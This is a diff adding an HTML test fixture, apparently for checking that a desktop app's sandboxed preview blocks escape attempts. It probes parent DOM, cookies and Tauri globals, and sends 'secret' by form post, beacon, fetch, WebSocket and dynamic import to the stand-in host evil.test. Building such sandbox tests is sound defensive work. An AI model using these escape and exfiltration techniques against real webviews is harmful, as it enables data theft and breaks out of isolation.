@@ -1,0 +1,196 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Hostile: escape attempts</title>
+    <!-- Tries to weaken the frame policy and redirect relative URLs. -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
+    />
+    <base href="http://evil.test/base/" />
+    <link rel="stylesheet" href="http://evil.test/style.css" />
+    <link rel="prefetch" href="http://evil.test/prefetch" />
+    <link rel="preload" as="image" href="http://evil.test/preload.png" />
+    <link rel="icon" href="http://evil.test/favicon.ico" />
+    <style>
+      @font-face {
+        font-family: X;
+        src: url(http://evil.test/font.woff2);
+      }
+      body {
+        font-family: X;
+        background-image: url(http://evil.test/bg.png);
+      }
+    </style>
+    <script src="http://evil.test/remote.js"></script>
+  </head>
+  <body>
+    <img src="http://evil.test/pixel.png" />
+    <img src="relative-pixel.png" />
+    <iframe src="http://evil.test/frame"></iframe>
+    <object data="http://evil.test/object"></object>
+    <audio src="http://evil.test/sound.mp3" autoplay></audio>
+    <video src="http://evil.test/video.mp4" autoplay></video>
+    <form id="form" action="http://evil.test/form" method="post">
+      <input name="q" value="secret" />
+    </form>
+    <pre id="results">running</pre>
+    <script>
+      var results = {};
+      function probe(name, fn) {
+        try {
+          var value = fn();
+          results[name] = value === undefined ? 'blocked' : 'LEAKED: ' + String(value).slice(0, 60);
+        } catch (e) {
+          results[name] = 'blocked';
+        }
+      }
+      function asyncProbe(name, promise) {
+        return Promise.resolve()
+          .then(function () {
+            return promise();
+          })
+          .then(
+            function (v) {
+              results[name] = 'LEAKED: ' + String(v).slice(0, 60);
+            },
+            function () {
+              results[name] = 'blocked';
+            },
+          );
+      }
+      probe('parent DOM', function () {
+        return parent.document.title;
+      });
+      probe('top DOM', function () {
+        return top.document.body.innerHTML;
+      });
+      probe('parent location', function () {
+        return parent.location.href;
+      });
+      probe('opener', function () {
+        return window.opener || undefined;
+      });
+      probe('cookies', function () {
+        document.cookie = 'stolen=1';
+        return document.cookie || undefined;
+      });
+      probe('tauri globals', function () {
+        return (
+          window.__TAURI__ ||
+          window.__TAURI_INTERNALS__ ||
+          window.__TAURI_IPC__ ||
+          window.ipc ||
+          undefined
+        );
+      });
+      probe('top navigation', function () {
+        top.location.href = 'http://evil.test/top';
+        return 'navigated';
+      });
+      probe('popup', function () {
+        return window.open('http://evil.test/popup') || undefined;
+      });
+      probe('alert dialog', function () {
+        alert('hi');
+        return undefined;
+      });
+      probe('form submit', function () {
+        document.getElementById('form').submit();
+        return undefined;
+      });
+      // sendBeacon returns true when queued, even if CSP then refuses it; whether anything
+      // actually left is verified by the test's network tracking.
+      probe('beacon', function () {
+        navigator.sendBeacon('http://evil.test/beacon', 'secret');
+        return undefined;
+      });
+      probe('quota', function () {
+        localStorage.setItem('huge', 'x'.repeat(3 * 1024 * 1024));
+        return 'stored 6 MB';
+      });
+      var big = document.createElement('a');
+      big.href = 'http://evil.test/download';
+      big.download = 'x.txt';
+      document.body.appendChild(big);
+      probe('download link', function () {
+        big.click();
+        return undefined;
+      });
+
+      Promise.all([
+        asyncProbe('fetch remote', function () {
+          return fetch('http://evil.test/fetch').then(function (r) {
+            return r.status;
+          });
+        }),
+        asyncProbe('fetch app origin', function () {
+          return fetch('/').then(function (r) {
+            return r.status;
+          });
+        }),
+        asyncProbe('xhr', function () {
+          return new Promise(function (ok, fail) {
+            var x = new XMLHttpRequest();
+            x.open('GET', 'http://evil.test/xhr');
+            x.onload = function () {
+              ok(x.status);
+            };
+            x.onerror = fail;
+            x.send();
+          });
+        }),
+        asyncProbe('websocket', function () {
+          return new Promise(function (ok, fail) {
+            var ws = new WebSocket('ws://evil.test/ws');
+            ws.onopen = function () {
+              ok('open');
+            };
+            ws.onerror = fail;
+          });
+        }),
+        asyncProbe('eventsource', function () {
+          return new Promise(function (ok, fail) {
+            var es = new EventSource('http://evil.test/sse');
+            es.onopen = function () {
+              ok('open');
+            };
+            es.onerror = fail;
+          });
+        }),
+        asyncProbe('dynamic import', function () {
+          return import('http://evil.test/module.js');
+        }),
+        asyncProbe('worker', function () {
+          return new Promise(function (ok, fail) {
+            var w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)'])));
+            w.onmessage = function () {
+              ok('worker ran');
+            };
+            w.onerror = fail;
+          });
+        }),
+        asyncProbe('indexedDB', function () {
+          return new Promise(function (ok, fail) {
+            var r = indexedDB.open('x');
+            r.onsuccess = function () {
+              ok('opened');
+            };
+            r.onerror = fail;
+          });
+        }),
+        asyncProbe('cache storage', function () {
+          return caches.keys();
+        }),
+        asyncProbe('clipboard', function () {
+          return navigator.clipboard.writeText('secret').then(function () {
+            return 'written';
+          });
+        }),
+      ]).then(function () {
+        document.getElementById('results').textContent = JSON.stringify(results);
+      });
+    </script>
+  </body>
+</html>
